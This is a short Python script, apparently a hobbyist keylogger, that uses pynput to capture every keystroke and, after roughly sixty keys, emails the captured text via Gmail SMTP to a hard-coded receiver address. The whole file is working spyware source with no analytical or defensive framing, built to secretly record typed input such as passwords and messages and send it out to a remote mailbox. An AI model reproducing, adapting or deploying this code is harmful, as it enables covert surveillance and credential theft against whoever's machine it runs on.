import pynput
from pynput.keyboard import Key, Listener

#Author ~Armin~ My Programming Name ~SaMi~
count = 0
keys = []


def send_Email(message):
    import ssl
    from email.message import EmailMessage
    import smtplib

    email_sender = 'arsamdev7@gmail.com'
    email_password = 'Put_your_own_app_Geberated_password_not_gmail_mail_password'
    email_receiver = 'arminttwat@gmail.com'

    subject = 'Test v1.0 Send JPG Files ( emaile automated by python !'
    body = """
    This is Test fases of log project
    """

    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = subject
    em.set_content(body)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_sender, email_password)
        smtp.sendmail(email_sender, email_receiver, message)


def on_press(key):
    print(key, end=" ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    # set si9ze of text to sent
    if count > 60:
        count = 0
        email(keys)


def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key.find("Key") > 0:
            k = ""
        message += k
    print(message)
    send_Email(message)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
